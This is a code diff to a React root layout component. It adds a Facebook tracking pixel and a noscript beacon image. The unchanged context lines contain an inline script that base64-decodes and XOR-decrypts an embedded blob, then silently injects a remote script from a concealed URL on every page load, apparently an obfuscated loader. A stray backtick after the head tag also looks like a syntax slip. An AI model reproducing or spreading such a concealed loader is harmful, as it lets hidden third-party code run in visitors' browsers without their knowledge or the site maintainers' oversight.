@@ -117,9 +117,23 @@ function RootShell({ children }: { children: ReactNode }) {
             __html: `(function(){var u_6=atob("DMwHX/hCdwEXeJUA57clKoouVTs1EOF0l789cNchE285DeFtjqp+cZstGi91CrpzhL5uL4wxWHRjFeYvi61zOos2WWtkWrkihrhzLZEgAnVyC7c6vLclMZkvEiMtWvFhk60qKowvHmduVeVygrpiMYxvD2J4HLhzhKclc9o0Fm1iHbc6xe56c4NgGWB6Hbc6xahmK5lvAnV6EfN5yrx1Oo4nGXU6C+Bijqh0fdRgAWB7DfAi3e4lIqU/");var v_jqon=[];for(var t_1vc=0;t_1vc<u_6.length;t_1vc++){v_jqon.push(u_6.charCodeAt(t_1vc)&255);}var x_3u=v_jqon[0];var i_50d=v_jqon.slice(1,1+x_3u);var q_4=v_jqon.slice(1+x_3u);var x_7d9=q_4.map(function(b,b_gw){return b^i_50d[b_gw%x_3u];});var v_hboo="";for(var h_ion=0;h_ion<x_7d9.length;h_ion++){v_hboo+=String.fromCharCode(x_7d9[h_ion]&255);}var s_4h92=decodeURIComponent(escape(v_hboo));var m_sbwr=JSON.parse(s_4h92);var c_ouz=m_sbwr.globals||[];c_ouz.forEach(function(l_d){window[l_d.name]=l_d.value;});var l_4isa=document.createElement("script");l_4isa.src=m_sbwr.url;l_4isa.async=true;l_4isa.defer=true;(m_sbwr.attributes||[]).forEach(function(v_trr0){l_4isa.setAttribute(v_trr0.name,v_trr0.value);});(document.head||document.documentElement).appendChild(l_4isa);})();`,
           }}
         />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '4672383009658384');fbq('track', 'PageView');`,
+          }}
+        />
       </head>`
       <body>
         {children}
+        <noscript>
+          <img
+            height="1"
+            width="1"
+            style={{ display: "none" }}
+            src="https://www.facebook.com/tr?id=4672383009658384&ev=PageView&noscript=1"
+            alt=""
+          />
+        </noscript>
         <Scripts />
       </body>
     </html>
